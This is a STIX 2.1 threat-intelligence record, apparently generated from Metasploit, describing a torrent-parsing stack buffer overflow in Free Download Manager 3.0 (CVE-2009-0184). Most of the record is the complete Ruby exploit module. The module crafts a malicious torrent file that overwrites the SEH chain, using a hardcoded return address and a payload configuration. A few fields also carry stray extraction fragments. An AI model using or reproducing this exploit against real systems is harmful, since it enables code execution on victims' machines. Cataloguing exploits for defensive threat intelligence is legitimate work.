{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--50157884-dead-4dc6-8bc0-c325de1485c2",
    "created": "2024-08-14T16:37:30.49566Z",
    "modified": "2024-08-14T16:37:30.495664Z",
    "name": "Free Download Manager Torrent Parsing Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Free Download Manager 3.0 Build 844. Arbitrary code execution could occur when parsing a specially crafted torrent file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/fdm_torrent.rb",
            "external_id": "fdm_torrent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0184"
        },
        {
            "source_name": "reference",
            "url": "http://freedownload.svn.sourceforge.net/viewvc/freedownload/FDM/vmsBtDownloadManager.cpp?r1=11&r2=18"
        },
        {
            "source_name": "reference",
            "url": "http://freedownload.svn.sourceforge.net/viewvc/freedownload/FDM/Bittorrent/fdmbtsupp/vmsBtFileImpl.cpp?r1=9&r2=18"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20090205145829/http://secunia.com:80/secunia_research/2009-5"
        },
        {
            "source_name": "reference",
            "url": "http://downloads.securityfocus.com/vulnerabilities/exploits/33555-SkD.pl"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Free Download Manager Torrent Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Free Download Manager\n        3.0 Build 844. Arbitrary code execution could occur when parsing a\n        specially crafted torrent file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'SkD <skdrat[at]hotmail.com>',\n          'jduck',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0184' ],\n          [ 'OSVDB', '54033' ],\n          [ 'BID', '33555' ],\n          [ 'URL', 'http://freedownload.svn.sourceforge.net/viewvc/freedownload/FDM/vmsBtDownloadManager.cpp?r1=11&r2=18' ],\n          [ 'URL', 'http://freedownload.svn.sourceforge.net/viewvc/freedownload/FDM/Bittorrent/fdmbtsupp/vmsBtFileImpl.cpp?r1=9&r2=18' ],\n          [ 'URL', 'http://web.archive.org/web/20090205145829/http://secunia.com:80/secunia_research/2009-5' ],\n          [ 'URL', 'http://downloads.securityfocus.com/vulnerabilities/exploits/33555-SkD.pl' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'DisableNops'   =>  'True',\n          'BadChars' => \"\\x00\\x2c\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Free Download Manager 3.0 (Build 844)',\n            {\n              'Ret' => 0x76051372 # pop/pop/ret @ msvcp60.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-02-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.torrent']),\n      ])\n  end\n\n  def exploit\n\n    bof = rand_text_alphanumeric(10004) + generate_seh_payload(target.ret)\n    # hit the end of the stack...\n    bof << rand_text(1000) * 50\n\n    len = rand(10*1024*1024)\n    info_hash = {\n      'length' => len,\n      'name' => bof,\n      'piece length' => len + rand(262144 - len),\n      'pieces' => rand_text(20),\n    }\n\n    ann_hash = {\n      'info' => info_hash,\n    }\n\n    encoded = bencode_hash(ann_hash)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(encoded)\n\n  end\n\n  # bencoding functions:\n  #\n  # http://wiki.theory.org/BitTorrentSpecification\n  #\n  def bencode_string(str)\n    ret = \"%d:\" % str.length\n    ret << str\n    return ret\n  end\n\n  def bencode_int(int)\n    ret = \"i%de\" % int\n    return ret\n  end\n\n  def bencode_item(item)\n    case item\n    when Integer\n      return bencode_int(item)\n    when String\n      return bencode_string(item)\n    when Hash\n      return bencode_hash(item)\n    else\n      throw(\"unsupported bencode data type! \" + item.testzt)\n    end\n  end\n\n  def bencode_list(list)\n    ret = \"l\"\n    list.each do |el|\n      ret << bencode_item(el)\n    end\n    ret << \"e\"\n    return ret\n  end\n\n  def bencode_hash(hash)\n    ret = \"d\"\n    hash.keys.sort.each do |k|\n      ret << bencode_item(k)\n      ret << bencode_item(hash[k])\n    end\n    ret << \"e\"\n    return ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-02",
    "x_mitre_platforms": [
        "win'"
    ]
}